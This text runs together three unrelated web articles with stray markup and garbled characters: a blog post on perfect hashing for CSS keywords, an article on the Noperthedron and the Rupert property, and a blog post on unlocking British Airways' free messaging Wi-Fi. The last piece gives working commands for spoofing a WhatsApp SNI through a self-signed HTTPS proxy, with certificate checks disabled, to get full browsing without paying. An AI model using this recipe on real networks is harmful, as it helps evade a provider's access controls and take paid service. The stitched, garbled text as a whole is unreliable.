    &lt;p&gt;Wojciech Muła posted about modern perfect hashing for strings and I wanted to make some comments about my own implementation (that sadly never got productionized because doubling the speed compared to gperf wasn't really that impactful in the end).&lt;/p&gt;
    &lt;p&gt;First, let's define the problem, just so we're all on the same page; the goal is to create code that maps a known, fixed set of strings to a predefined integer (per string), and rejects everything else. This is essentially the same as a hash table, except that since the set of strings is known ahead of time, we can do better than a normal hash table. (So no “but I heard SwissTables uses SIMD and thus cannot be beat”, please. :-) ) My use case is around a thousand strings or so, and we'll assume that a couple of minutes of build time is OK (shorter would be better, but we can probably cache somehow). If you've got millions of strings, and you don't know them compile-time (for instance because you want to use your hash table in the join phase of a database), see this survey; it's a different problem with largely different solutions.&lt;/p&gt;
    &lt;p&gt;Like Wojciech, I started splitting by length. This means that we can drop all bounds checking after this, memcmp will be optimized by the compiler to use SIMD if relevant, and so on.&lt;/p&gt;
    &lt;p&gt;But after that, he recommends using PEXT (bit extraction, from BMI2), which has two problems: First, the resulting table can get quite big if your input set isn't well-behaved. (You can do better than the greedy algorithm he suggests, but not infinitely so, and finding the optimal mask quickly is sort of annoying if you don't want to embed a SAT solver or something.) Second, I needed the code to work on Arm, where you simply don't have this instruction or anything like it available. (Also, not all x86 has it, and on older Zen, it's slow.)&lt;/p&gt;
    &lt;p&gt;So, we need some other way, short of software emulation of PEXT (which exists, but we'd like to do better), to convert a sparse set of bits into a table without any collisions. It turns out the computer chess community has needed to grapple with this for a long time (they want to convert from “I have a \&lt;code&gt;((value &amp;amp; mask) * magic)&lt;/code&gt;, it is very
likely that the upper bits will be collision-free between your different
&lt;code&gt;value&lt;/code&gt;s if you try enough different numbers for &lt;code&gt;magic&lt;/code&gt;. We can use this
too; for instance, here is code for all length-4 CSS keywords:&lt;/p&gt;
    &lt;quote&gt;static const uint8_t table[] = { 6, 0, 0, 3, 2, 5, 9, 0, 0, 1, 0, 8, 7, 0, 0, }; static const uint8_t strings[] = { 1, 0, 'z', 'o', 'o', 'm', 2, 0, 'c', 'l', 'i', 'p', 3, 0, 'f', 'i', 'l', 'l', 4, 0, 'l', 'e', 'f', 't', 5, 0, 'p', 'a', 'g', 'e', 6, 0, 's', 'i', 'z', 'e', 7, 0, 'f', 'l', 'e', 'x', 8, 0, 'f', 'o', 'n', 't', 9, 0, 'g', 'r', 'i', 'd', 10, 0, 'm', 'a', 's', 'k', }; uint16_t block; memcpy(&amp;amp;block, str + 0, sizeof(block)); uint32_t pos = uint32_t(block * 0x28400000U) &amp;gt;&amp;gt; 28; const uint8_t *candidate = strings + 6 * table[pos]; if (memcmp(candidate + 2, str, 4) == 0) { return candidate[0] + (candidate[1] &amp;lt;&amp;lt; 8); } return 0;&lt;/quote&gt;
    &lt;p&gt;There's a bit to unpack here; we read the first 16 bits from our value with memcpy (big-endian users beware!), multiply it with the magic value &lt;code&gt;0x28400000U&lt;/code&gt; found by trial
and error, shift the top bits down, and now all of our ten candidate
values (“zoom”, “clip”, etc.) have different top four bits. We use that to index
into a small table, check that we got the right one instead of a random collision
(e.g. “abcd”, 0x6261, would get a value of 12, and &lt;code&gt;table[12]&lt;/code&gt; is 7,
so we need to disambiguate that from “flex”, which is what we are actually looking
for in that spot), and then return the 16-bit identifier related to the match (or zero,
if we didn't find it).&lt;/p&gt;
    &lt;p&gt;We don't need to use the first 16 bits; we could have used any other consecutive 16 bits, or any 32 bits, or any 64 bits, or possibly any of those masked off, or even XOR of two different 32-bit sets if need be. My code prefers smaller types because a) they tend to give smaller code size (easier to load into registers, or can even be used as immediates), and b) you can bruteforce them instead of doing random searches (which, not the least, has the advantage that you can give up much quicker).&lt;/p&gt;
    &lt;p&gt;You also don't really need the intermediate table; if the fit is particularly good, you can just index directly into the final result without wasting any space. Here's the case for length-24 CSS keywords, where we happened to have exactly 16 candidates and we found a magic giving a perfect (4-bit) value, making it a no-brainer:&lt;/p&gt;
    &lt;quote&gt;static const uint8_t strings[] = { 95, 0, 'b', 'o', 'r', 'd', 'e', 'r', '-', 'b', 'l', 'o', 'c', 'k', '-', 's', 't', 'a', 'r', 't', '-', 'w', 'i', 'd', 't', 'h', 40, 0, '-', 'w', 'e', 'b', 'k', 'i', 't', '-', 't', 'e', 'x', 't', '-', 'o', 'r', 'i', 'e', 'n', 't', 'a', 't', 'i', 'o', 'n', 115, 1, 's', 'c', 'r', 'o', 'l', 'l', '-', 'p', 'a', 'd', 'd', 'i', 'n', 'g', '-', 'b', 'l', 'o', 'c', 'k', '-', 'e', 'n', 'd', 198, 2, '-', 'w', 'e', 'b', 'k', 'i', 't', '-', 't', 'r', 'a', 'n', 's', 'f', 'o', 'r', 'm', '-', 'o', 'r', 'i', 'g', 'i', 'n', 225, 0, '-', 'i', 'n', 't', 'e', 'r', 'n', 'a', 'l', '-', 'o', 'v', 'e', 'r', 'f', 'l', 'o', 'w', '-', 'b', 'l', 'o', 'c', 'k', 101, 2, '-', 'w', 'e', 'b', 'k', 'i', 't', '-', 'b', 'o', 'r', 'd', 'e', 'r', '-', 'e', 'n', 'd', '-', 's', 't', 'y', 'l', 'e', 93, 0, 'b', 'o', 'r', 'd', 'e', 'r', '-', 'b', 'l', 'o', 'c', 'k', '-', 's', 't', 'a', 'r', 't', '-', 'c', 'o', 'l', 'o', 'r', 102, 2, '-', 'w', 'e', 'b', 'k', 'i', 't', '-', 'b', 'o', 'r', 'd', 'e', 'r', '-', 'e', 'n', 'd', '-', 'w', 'i', 'd', 't', 'h', 169, 1, 't', 'e', 'x', 't', '-', 'd', 'e', 'c', 'o', 'r', 'a', 't', 'i', 'o', 'n', '-', 's', 'k', 'i', 'p', '-', 'i', 'n', 'k', 156, 0, 'c', 'o', 'n', 't', 'a', 'i', 'n', '-', 'i', 'n', 't', 'r', 'i', 'n', 's', 'i', 'c', '-', 'h', 'e', 'i', 'g', 'h', 't', 201, 2, '-', 'w', 'e', 'b', 'k', 'i', 't', '-', 't', 'r', 'a', 'n', 's', 'i', 't', 'i', 'o', 'n', '-', 'd', 'e', 'l', 'a', 'y', 109, 1, 's', 'c', 'r', 'o', 'l', 'l', '-', 'm', 'a', 'r', 'g', 'i', 'n', '-', 'i', 'n', 'l', 'i', 'n', 'e', '-', 'e', 'n', 'd', 240, 0, '-', 'i', 'n', 't', 'e', 'r', 'n', 'a', 'l', '-', 'v', 'i', 's', 'i', 't', 'e', 'd', '-', 's', 't', 'r', 'o', 'k', 'e', 100, 2, '-', 'w', 'e', 'b', 'k', 'i', 't', '-', 'b', 'o', 'r', 'd', 'e', 'r', '-', 'e', 'n', 'd', '-', 'c', 'o', 'l', 'o', 'r', 94, 0, 'b', 'o', 'r', 'd', 'e', 'r', '-', 'b', 'l', 'o', 'c', 'k', '-', 's', 't', 'a', 'r', 't', '-', 's', 't', 'y', 'l', 'e', 196, 2, '-', 'w', 'e', 'b', 'k', 'i', 't', '-', 't', 'e', 'x', 't', '-', 's', 'i', 'z', 'e', '-', 'a', 'd', 'j', 'u', 's', 't', }; uint32_t block; memcpy(&amp;amp;block, str + 16, sizeof(block)); uint32_t pos = uint32_t(block * 0xe330a008U) &amp;gt;&amp;gt; 28; const uint8_t *candidate = strings + 26 * pos; if (memcmp(candidate + 2, str, 24) == 0) { return candidate[0] + (candidate[1] &amp;lt;&amp;lt; 8); } return 0;&lt;/quote&gt;
    &lt;p&gt;You can see that we used a 32-bit value here (bytes 16 through 19 of the input), and a corresponding 32-bit magic (though still not with an AND mask). So we got fairly lucky, but sometimes you do that. Of course, we need to validate the entire 24-byte value even though we only discriminated on four of the bytes! (Unless you know for sure that you never have any out-of-distribution inputs, that is. There are use cases where this is true.)&lt;/p&gt;
    &lt;p&gt;(If you wonder what &lt;code&gt;95, 0&lt;/code&gt; or similar is above; that's just
“the answer the user wanted for that input”. It corresponds to
a 16-bit enum in the parser.)&lt;/p&gt;
    &lt;p&gt;If there are only a few values, we don't need any of this; just like Wojciech, we do with a simple compare. Here's the generated code for all length-37 CSS keywords, plain and simple:&lt;/p&gt;
    &lt;quote&gt;if (memcmp(str, "-internal-inactive-list-box-selection", 37) == 0) { return 171; } return 0;&lt;/quote&gt;
    &lt;p&gt;(Again 171 is “the desired output for that input”, not a value the code generator decides in any way.)&lt;/p&gt;
    &lt;p&gt;So how do we find these magic values? There's really only one way: Try lots of different ones and see if they work. But there's a trick to accelerate “see if they work”, which I also borrowed from computer chess: The killer heuristic.&lt;/p&gt;
    &lt;p&gt;See, to try if a magic is good, you generally try to hash all the different values and see if any two go into the same bucket. (If they do, it's not a perfect hash and the entire point of the exercise is gone.) But it turns out that most of the time, it's the same two values that collide. So every couple hundred candidates, we check which two values disproved the magic, and put those in a slot. Whenever we check magics, we can now try those first, and more likely than not, discard the candidate right away and move on to the next one (whether it is by exhaustive search or randomness). It's actually a significant speedup.&lt;/p&gt;
    &lt;p&gt;But occasionally, we simply cannot find a magic for a given group; either there is none, or we didn't have enough time to scan through enough of the 64-bit space. At this point, Wojciech suggests we switch on one of the characters (heuristically) to get smaller subgroups and try again. I didn't actually find this to perform all that well; indirect branch predictors are better than 20 years ago, but the pattern is typically not that predictable. What I tried instead was to have more of a yes/no on some character (i.e., a non-indirect branch), which makes for a coarser split.&lt;/p&gt;
    &lt;p&gt;It's not at all obvious where the best split would be. You'd intuitively think that 50/50 would be a good idea, but if you have e.g. 40 elements, you'd much rather split them 32/8… if you can find perfect hashes for both subgroups (5-bit and 3-bit, respectively). If not, a 20–20 split is most likely better, since you very easily can find magics that put 20 elements into 32 buckets without collisions. I ended up basically trying all the different splits and scoring them, but this makes the searcher rather slow, and it means you basically must have some sort of cache if you want to run it as part of your build system. This is the part I'm by far the least happy about; gperf isn't great by modern standards, but it never feels slow to run.&lt;/p&gt;
    &lt;p&gt;The end result for me was: Runtime about twice as fast as gperf, compiled code about half as big. That's with everything hard-coded; if you're pushed for space (or are icache-bound), you could make more generic code at the expense of some speed.&lt;/p&gt;
    &lt;p&gt;So, if anyone wants to make a more modern gperf, I guess this space is up for grabs? It's not exactly technology that will make your stock go to AI levels, though.&lt;/p&gt;
  &lt;/main&gt;

    &lt;head rend="h1"&gt;First Shape Found That Can’t Pass Through Itself&lt;/head&gt;
    &lt;head rend="h2"&gt;Introduction&lt;/head&gt;
    &lt;p&gt;Imagine you’re holding two equal-size dice. Is it possible to bore a tunnel through one die that’s big enough for the other to slide through?&lt;/p&gt;
    &lt;p&gt;Perhaps your instinct is to say “Surely not!” If so, you’re not alone. In the late 1600s, an unidentified person placed a bet to that effect with Prince Rupert of the Rhine. Rupert — a nephew of Charles I of England who commanded the Royalist forces in the English Civil War — spent his sunset years studying metallurgy and glassmaking in his laboratory at Windsor Castle.&lt;/p&gt;
    &lt;p&gt;Rupert won the bet. The mathematician John Wallis, recounting the story in 1693, didn’t say whether Rupert wrote a proof or bored a hole through an actual cube. But Wallis himself proved mathematically that, if you drill a straight tunnel in the direction of one of the cube’s inner diagonals, it can be made wide enough to allow another cube through. It’s a tight squeeze: If you make the second cube just 4% larger, it will no longer fit.&lt;/p&gt;
    &lt;p&gt;It’s natural to wonder which other shapes have this property. “I think of this problem as being quite canonical,” said Tom Murphy, a software engineer at Google who has explored the question extensively in his free time. It “would have gotten rediscovered and rediscovered — aliens would have come to this one.”&lt;/p&gt;
    &lt;p&gt;Mark Belan/Quanta Magazine&lt;/p&gt;
    &lt;p&gt;The full menagerie of shapes is too diverse to get a handle on, so mathematicians tend to focus on convex polyhedra: shapes, like the cube, that have flat sides and no protrusions or indentations. When such a shape is much wider in some directions than others, it’s usually easy to find a straight tunnel that will allow another copy of the shape to pass through. But many famous convex polyhedra — for instance the dodecahedron, or the truncated icosahedron, the shape that forms a soccer ball — are highly symmetric and difficult to analyze. Among these, “for hundreds of years we only knew of the cube,” said Jakob Steininger, a mathematician at Statistics Austria, Austria’s federal statistics organization.&lt;/p&gt;
    &lt;p&gt;Then, in 1968, Christoph Scriba proved that the tetrahedron and octahedron also have the “Rupert property,” as mathematicians now call it. And in a burst of activity over the past decade, professional mathematicians and hobbyists have found Rupert tunnels through many of the most widely studied convex polyhedra, including the dodecahedron, icosahedron and soccer ball.&lt;/p&gt;
    &lt;p&gt;The Rupert property appeared to be so widespread that mathematicians conjectured a general rule: Every convex polyhedron will have the Rupert property. No one could find one that didn’t — until now.&lt;/p&gt;
    &lt;p&gt;In a paper posted online in August, Steininger and Sergey Yurkevich — a researcher at A&amp;amp;R Tech, an Austrian transportation systems company — describe a shape with 90 vertices and 152 faces that they’ve named the Noperthedron (after “Nopert,” a coinage by Murphy that combines “Rupert” and “nope”). Steininger and Yurkevich proved that no matter how you bore a straight tunnel through a Noperthedron, a second Noperthedron cannot fit through.&lt;/p&gt;
    &lt;p&gt;The proof required a mix of theoretical advances and massive computer calculations, and relies on a delicate property of the Noperthedron’s vertices. “It’s a miracle that it works,” Steininger said.&lt;/p&gt;
    &lt;head rend="h2"&gt;Passing Through the Shadows&lt;/head&gt;
    &lt;p&gt;To see how one cube can pass through another, imagine holding a cube over a table and examining its shadow (assuming it’s illuminated from above). If you hold the cube in the standard position, the shadow is a square. But if you point one of the corners directly upward, the shadow is a regular hexagon.&lt;/p&gt;
    &lt;p&gt;In 1693, Wallis showed that the square shadow fits inside the hexagon, leaving a thin margin. That means that if you point a cube’s corner upward, you can bore a vertical tunnel that’s big enough for a second cube to pass through. About a century later, Pieter Nieuwland showed that a different orientation casts an even better shadow — one that can accommodate a cube more than 6% larger than the cube with the tunnel.&lt;/p&gt;
    &lt;p&gt;Mark Belan/Quanta Magazine&lt;/p&gt;
    &lt;p&gt;Every subsequent analysis of more complicated shapes has relied on this process of turning the shape in different directions and looking for one shadow that fits inside another. With the aid of computers, mathematicians have found Rupert passages through a wide variety of shapes. Some are incredibly tight fits — for instance, the passage in a “triakis tetrahedron” has a margin that’s only about 0.000002 times the length of the shape’s radius. “The world of mixing computation and discrete geometry has flowered to make these kinds of calculations possible,” said Joseph O’Rourke, an emeritus professor at Smith College.&lt;/p&gt;
    &lt;p&gt;Researchers who have written algorithms to find Rupert passages have noticed a curious dichotomy: For any given convex polyhedron, the algorithm seems to either find a passage almost immediately, or not find one at all. In the past five years, mathematicians have accumulated a small collection of holdout shapes for which no passage has been found.&lt;/p&gt;
    &lt;p&gt;“I’ve had my desktop churn for two weeks on trying the rhombicosidodecahedron,” said Benjamin Grimmer, an applied mathematician at Johns Hopkins University, referring to a solid made of 62 regular triangles, squares and pentagons. “That one just seems to resist any attempt.”&lt;/p&gt;
    &lt;p&gt;But such resistance doesn’t prove that a shape is a Nopert. There are infinitely many ways to orient a shape, and a computer can only check finitely many. Researchers don’t know whether the holdouts are true Noperts or just shapes whose Rupert passages are hard to find.&lt;/p&gt;
    &lt;p&gt;What they do know is that candidate Noperts are incredibly rare. Starting last year, Murphy began to construct hundreds of millions of shapes. These include random polyhedra, polyhedra whose vertices lie on a sphere, polyhedra with special symmetries, and polyhedra in which he moved one vertex to intentionally mess up a previous Rupert passage. His algorithm easily found Rupert tunnels for nearly every one.&lt;/p&gt;
    &lt;p&gt;The contrast between these quick results and the stubbornness of the Nopert holdouts made some mathematicians suspect that true Noperts do exist. But until August, all they had were suspicions.&lt;/p&gt;
    &lt;head rend="h2"&gt;No Passage&lt;/head&gt;
    &lt;p&gt;Steininger, now 30, and Yurkevich, 29, have been friends since they participated together as teenagers in mathematics Olympiad competitions. Even though both eventually left academia (after a doctorate for Yurkevich and a master’s for Steininger), they have continued to explore unsolved problems together.&lt;/p&gt;
    &lt;p&gt;“We just had pizza three hours ago, and we talked about math almost the whole time,” Steininger told Quanta. “That’s what we do.”&lt;/p&gt;
    &lt;p&gt;Five years ago, the pair happened upon a YouTube video of one cube passing through another, and they were instantly smitten. They developed an algorithm to search for Rupert tunnels and soon became convinced that some shapes were Noperts. In a 2021 paper, they conjectured that the rhombicosidodecahedron is not Rupert. Their work, which preceded Murphy’s and Grimmer’s recent explorations, was, “I think, the first to conjecture that there might be solids that don’t have this property,” Steininger said.&lt;/p&gt;
    &lt;p&gt;If you want to prove that a shape is a Nopert, you must rule out Rupert tunnels for every possible orientation of the two shapes. Each orientation can be written down as a collection of rotation angles. This collection of angles can then be represented as a point in a higher-dimensional “parameter space.”&lt;/p&gt;
    &lt;p&gt;Florentina Stadlbauer; Courtesy of Jakob Steininger&lt;/p&gt;
    &lt;p&gt;Suppose you choose an orientation for your two shapes, and the computer tells you that the second shadow sticks out past the border of the first shadow. This rules out one point in the parameter space.&lt;/p&gt;
    &lt;p&gt;But you may be able to rule out much more than a single point. If the second shadow sticks out significantly, it would require a big change to move it inside the first shadow. In other words, you can rule out not just your initial orientation but also “nearby” orientations — an entire block of points in the parameter space. Steininger and Yurkevich came up with a result they called their global theorem, which quantifies precisely how large a block you can rule out in these cases. By testing many different points, you can potentially rule out block after block in the parameter space.&lt;/p&gt;
    &lt;p&gt;If these blocks cover the entire parameter space, you’ll have proved that your shape is a Nopert. But the size of each block depends on how far the second shadow sticks out beyond the first, and sometimes it doesn’t stick out very far. For instance, suppose you start with the two shapes in exactly the same position, and then you slightly rotate the second shape. Its shadow will at most stick out just a tiny bit past the first shadow, so the global theorem will only rule out a tiny box. These boxes are too small to cover the whole parameter space, leaving the possibility that some point you’ve missed might correspond to a Rupert tunnel.&lt;/p&gt;
    &lt;p&gt;To deal with these small reorientations, the pair came up with a complement to their global theorem that they called the local theorem. This result deals with cases where you can find three vertices (or corner points) on the boundary of the original shadow that satisfy some special requirements. For instance, if you connect those three vertices to form a triangle, it must contain the shadow’s center point. The researchers showed that if these requirements are met, then any small reorientation of the shape will create a shadow that pushes at least one of the three vertices further outward. So the new shadow can’t lie inside the original shadow, meaning it doesn’t create a Rupert tunnel.&lt;/p&gt;
    &lt;p&gt;If your shape casts a shadow that lacks three appropriate vertices, the local theorem won’t apply. And all the previously identified Nopert candidates have at least one shadow with this problem. Steininger and Yurkevich sifted through a database of hundreds of the most symmetric and beautiful convex polyhedra, but they couldn’t find any shape whose shadows all worked. So they decided to generate a suitable shape themselves.&lt;/p&gt;
    &lt;p&gt;They developed an algorithm to construct shapes and test them for the three-vertices property. Eventually, the algorithm produced the Noperthedron, which is made of 150 triangles and two regular 15-sided polygons. It looks like a rotund crystal vase with a wide base and top; one fan of the work has already 3D-printed a copy to use as a pencil holder.&lt;/p&gt;
    &lt;p&gt;Peter Lely&lt;/p&gt;
    &lt;p&gt;Steininger and Yurkevich then divided the parameter space of orientations into approximately 18 million tiny blocks, and tested the center point of each block to see if its corresponding orientation produced a Rupert passage. None of them did. Next, the researchers showed that each block satisfied either the local or global theorem, allowing them to rule out the entire block. Since these blocks fill out the entire parameter space, this meant that there is no Rupert passage through the Noperthedron.&lt;/p&gt;
    &lt;p&gt;The “natural conjecture has been proved false,” O’Rourke said.&lt;/p&gt;
    &lt;p&gt;It remains to be seen whether mathematicians can use the new method to generate other Noperts, or if they can find a different local theorem that can handle candidates like the rhombicosidodecahedron. But now that mathematicians know that Noperts do exist, “we’re on sound footing to study other shapes,” Murphy said.&lt;/p&gt;
    &lt;p&gt;Murphy, who like Steininger and Yurkevich has been exploring the question for its own sake, independent of his day job, feels a kinship across the centuries with Prince Rupert. “I like that he chose to use his retirement to do math and science in his castle,” he said.&lt;/p&gt;
    &lt;p&gt;Meanwhile, Steininger and Yurkevich are on the lookout for new questions to tackle. “We’re just humble mathematicians — we love working on such problems,” Steininger said. “We’ll keep doing that.”&lt;/p&gt;
  &lt;/main&gt;

  &lt;main&gt;
    &lt;head rend="h1"&gt;Unlocking free WiFi on British Airways&lt;/head&gt;
    &lt;p&gt;I was recently flying between HKG &amp;amp; LHR via British Airways. Iâd done the same flight back in 2023, and remember relying on the in-flight entertainment for the 14 hour journey. However, this time on my way to London, they had an interesting offer: Free WiFi for âMessagingâ, for members of âThe British Airways Clubâ.&lt;/p&gt;
    &lt;p&gt;I was pretty sure I wasnât a member of any sort of club (Iâm only flying economy anyway); but turns out this is just the name of their frequent flyer program. Conveniently enough, youâre able to sign up for this via the captive portal while in the sky; and although it asks for your E-Mail you donât need to verify it (thereby allowing you to complete the signup without access to the internet).&lt;/p&gt;
    &lt;p&gt;Once signed in, the captive portal invited me to âStart sessionâ, which true to itâs word, let me start texting people. I tried Whatsapp, Signal, Wechat and Discord. The first three worked (though not for images), Discord expectedly did not. Not bad for free wifi!&lt;/p&gt;
    &lt;head rend="h2"&gt;How does it know?&lt;/head&gt;
    &lt;p&gt;This was the first question I had as soon as I confirmed messaging did work. Itâs 2025; everything should be encrypted in transit. So how does it know if Iâm using Whatsapp vs. Discord? One idea I had is it just somehow capped the bandwidth / data transfer of individual TCP connections; so when youâre sending a single message or two it gets through, but something larger would fail.&lt;/p&gt;
    &lt;p&gt;To test this, I used my phone to open up the classic: example.com. Unfortunately this didnât load - so there mustâve been a bit more going onâ¦&lt;/p&gt;
    &lt;p&gt;Thankfully I had my laptop on me, so the next step was to connect to WiFi with the devtools open to the network tab, and wireshark on the side for good measure. After registering for the WiFi again, it was time to play around a bit. Opening up something like example.com revealed a TCP reset in the wireshark, right after the Client Hello, and my brain immediately jumped to SNI. Itâs something thatâs really annoyed me about the TLS spec since itâs widely used by ISPs in India to block websites (although there is work being done to fix this; ECH (which was itself previously ESNI)).&lt;/p&gt;
    &lt;p&gt;tl;dr SNI reveals the domain name of EVERY website you connect to in the TLS handshake, before the tunnel is established! Although the actual contents of what youâre doing, on say, totallynondodgywebsite.com are encrypted, anyone on the wire can see that you connected to it (including ISPs). My guess was that they had a set of whitelisted domains used by messaging apps, and if they see anything else, they just reset the connection.&lt;/p&gt;
    &lt;p&gt;Sidebar: peopleâs reactions when I try to tell this are always extremely varied. Many of my non-technical friends think anything you do without a VPN is visible to everyone, while some slightly technical ones still think that the URL (including query params) is visible, but the responses are not. Finally there is some subset of people who believe TLS means all data is encrypted in transit between client &amp;amp; server, though they had no idea SNI leaks all the domains they visit!&lt;/p&gt;
    &lt;head rend="h2"&gt;Testing out the theory&lt;/head&gt;
    &lt;p&gt;Although BA blocks DNS queries to all (well all I could remember) public resolvers, they do resolve any domain you throw at them, including MX, TXT, HTTPS records. (This itself could be an interesting area of exploration; especially since the DNS resolution can be triggered before signing up for free WiFi. Something along the lines of arbitrary subdomains which represent the request payload, and a custom nameserver that returns responses via the TXT record or something. Anywayâ¦).&lt;/p&gt;
    &lt;p&gt;Getting the A record of my personal server, I made a TLS handshake to the IP address directly, without any SNI. This was then reset by BA; so the lack of SNI is also blocked!&lt;/p&gt;
    &lt;code&gt;$ openssl s_client -connect 95.217.167.10:443

&lt;/code&gt;
    &lt;p&gt;The next step was to try and test some SNI that might go through. Off the top of my head, I knew &lt;code&gt;wa.me&lt;/code&gt; was used by Whatsapp for some stuff, so I decided to use it. The way SNI works is it tells the server which host you want to connect to, so it can present the right TLS certificate. In my case, my server did not have any cert for &lt;code&gt;wa.me&lt;/code&gt; , but NGINX seemingly just ignores the SNI if it doesnât exist and returns the first cert (I think; could also be related to my config but I didnât look to much into this).&lt;/p&gt;
    &lt;p&gt;But basically, as long as I (the client) donât care, I can complete the TLS connection for any random cert the server offers me, even if in the SNI I provide a domain I donât control (e.g. &lt;code&gt;wa.me&lt;/code&gt; in this case).&lt;/p&gt;
    &lt;code&gt;$ openssl s_client -connect 95.217.167.10:443 -servername wa.me

&lt;/code&gt;
    &lt;p&gt;Success! Using a Whatsapp SNI tricked BA into thinking Iâm âmessagingâ, which allowed the TLS tunnel to be established. Since I am connected to the server, to make sure it works I wrote an HTTP/1.1 request within the socket; using the host header of a real website on my NGINX instance&lt;/p&gt;
    &lt;code&gt;GET / HTTP/1.1

    &lt;p&gt;I successfully managed to request and receive my homepage! All ~5KiB of it, not bad. Now the challenge was to extend this to browse any websiteâ¦&lt;/p&gt;
    &lt;head rend="h2"&gt;Enemies to Lovers&lt;/head&gt;
    &lt;p&gt;Ok, my relationship with SNI isnât as cliche as that, and I think weâre still enemies. But this opens up some exciting opportunities to say the least. If I can convince BA that Iâm connecting to &lt;code&gt;wa.me&lt;/code&gt;, I can potentially do whatever I want over that connection (under the guise of âmessagingâ). So the requirments were:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Establish a TLS connection using the SNI &lt;code&gt;wa.me&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Tunnel arbitrary traffic through that connection&lt;/item&gt;
      &lt;item&gt;Do all this without actually owning / controlling the &lt;code&gt;wa.me&lt;/code&gt;domain&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;From my past experiences w/ reverse-engineering etc., the most obvious way to do this seemed to be an HTTPS proxy. It had to be HTTPS specifically, since the connection to proxy was going to be what Iâd âfakeâ as Whatsapp. If the TLS handshake to the HTTPS proxy had the SNI &lt;code&gt;wa.me&lt;/code&gt; , BA should let it through, and then I can make the real requests I want via the proxy.&lt;/p&gt;
    &lt;p&gt;Unfortunately I was in the air, and without easy access to the internet to manage my servers and the like, I couldnât quite set all of this up; Iâd have to do that while on holiday and test it on the flight back. I could try and emulate the BA restrictions etc. while on thr ground, but I decided to YOLO it.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Setup&lt;/head&gt;
    &lt;p&gt;I managed to find one of my VPSs that wasnât already using port 443. Letâs assume the public IP was &lt;code&gt;333.333.333.333&lt;/code&gt; (yes I know octets donât go beyond &lt;code&gt;0xFF&lt;/code&gt;, if you really want my IP check the screenshots below). I then setup an HTTP proxy on it using tinyproxy. However this just sets up a basic HTTP proxy, which was listening on &lt;code&gt;127.0.0.1:8080&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;To add the TLS layer, I used stunnel. For the TLS setup of stunnel, I just generated some self-signed certs via openSSL using all defaults, except the common name (CN), for which I used &lt;code&gt;wa.me&lt;/code&gt;, since I wanted to try and ensure max compatibility (e.g. the client doesnât reject due to unexpected SNI vs. CN, or the server not knowing which cert to provide).&lt;/p&gt;
    &lt;code&gt;openssl req -nodes -newkey ed25519 -keyout ssl.key -x509 -days 365 -out ssl.crt
&lt;/code&gt;
    &lt;p&gt;UPDATE: actually, on the client I decided to ignore TLS errors (self-signed cert), and stunnel didnât care about SNI, so this (&lt;code&gt;CN&lt;/code&gt;) didnât matter too much. But for more legit use cases it definitely does!&lt;/p&gt;
    &lt;head rend="h2"&gt;Testing it out&lt;/head&gt;
    &lt;p&gt;To just make sure the proxy worked as expected, I tried it via curl directly on the IP:&lt;/p&gt;
    &lt;code&gt;$ curl -x https://user:pass@333.333.333.333:443 ifconfig.co -v
*   Trying 333.333.333.333:443...
* TLSv1.3 (OUT), TLS handshake, Client hello (1):

* TLSv1.3 (OUT), TLS alert, unknown CA (560):
* SSL certificate problem: self-signed certificate
* closing connection #0
curl: (60) SSL certificate problem: self-signed certificate
More details here: https://curl.se/docs/sslcerts.html

curl failed to verify the legitimacy of the server and therefore could not
establish a secure connection to it. To learn more about this situation and
how to fix it, please visit the webpage mentioned above.
&lt;/code&gt;
    &lt;p&gt;Of course! I just randomly generated the certs on my VPS, not signed by a âtrustedâ CA or anything. Well, we can tell cURL to ignore TLS errors for the proxy with the &lt;code&gt;--proxy-insecure&lt;/code&gt; flag, and now it works; the response is the IP of my VPS.&lt;/p&gt;
    &lt;p&gt;However thereâs a problem - if I connect to the proxy directly via the IP, there is no SNI extension set, so this would get blocked. The SNI extension is set when connection to a domain, so I need to configure &lt;code&gt;wa.me&lt;/code&gt; to point to &lt;code&gt;333.333.333.333&lt;/code&gt;. This can be done via the hosts file of course, but cURL also provides a quick CLI hack via &lt;code&gt;--resolve&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;curl --resolve wa.me:443:333.333.333.333 -x https://username:password@wa.me ifconfig.co --proxy-insecure -v
&lt;/code&gt;
    &lt;p&gt;This tells cURL how to resolve the IP. With this, I could now see the SNI being set to &lt;code&gt;wa.me&lt;/code&gt; via wireshark, and the connection to the proxy succeeding (TLS errors about the self-signed cert ignored of course). Not bad, now time to wait for my flight back to Hong Kongâ¦&lt;/p&gt;
    &lt;head rend="h2"&gt;Testing it in-flight&lt;/head&gt;
    &lt;p&gt;If Iâd messed something up, I was cooked, since without internet access I wouldnât be able to fix it! My flight back was at 1935hrs local time, but Iâd been up since 0400 thanks to an early morning flight in from Edinburgh, and then spent the day browsing the markets, having pints and watching the Emilia Romagna Grand Prix. The place I went to even had screens above the urinals!&lt;/p&gt;
    &lt;p&gt;Anyway, despite being up for ~16 hours already, I was ready to see if my work would, well, work. Once we were sky-high, I connected to the WiFi (from my laptop), signed up for the BA loyalty program, and activated the âMessagingâ plan. Trying the curl command from above, I got back an HTTP 200 from &lt;code&gt;ifconfig.co&lt;/code&gt; with my VPS IP; it worked! For good measure I tried cURLing some more websites like example.com, google.com etc. to make sure stuff seemed fine.&lt;/p&gt;
    &lt;p&gt;The next challenge was to extend this to web browsing. Thankfully most modern browsers support sending traffic through an HTTPS proxy, and chromium even has a flag to disable TLS cert warnings (so it wonât complain about my self-signed cert, which obviously doesnât belong to the real &lt;code&gt;wa.me&lt;/code&gt;).&lt;/p&gt;
    &lt;p&gt;I also had to set a DNS record for &lt;code&gt;wa.me&lt;/code&gt; to &lt;code&gt;333.333.333.333&lt;/code&gt; in my hosts file, so chromium would set the SNI to &lt;code&gt;wa.me&lt;/code&gt; in the TLS handshake, but the connection would be made to my VPS. Since the bandwidth would probably be quite limited (owing to not just the internet on an airplane, but proxying it via a VPS in Netherlands), I decided to load a very simple, text-heavy website: Hacker News.&lt;/p&gt;
    &lt;p&gt;Bada bing bada boom! Looks like we cooked. I can actually browse HN using BAâs free âmessagingâ WiFi! (Note: the reason you can see the HTTP requests in plaintext in wireshark is because I used SSLKEYLOGFILE and configured wireshark to decrypt TLS).&lt;/p&gt;
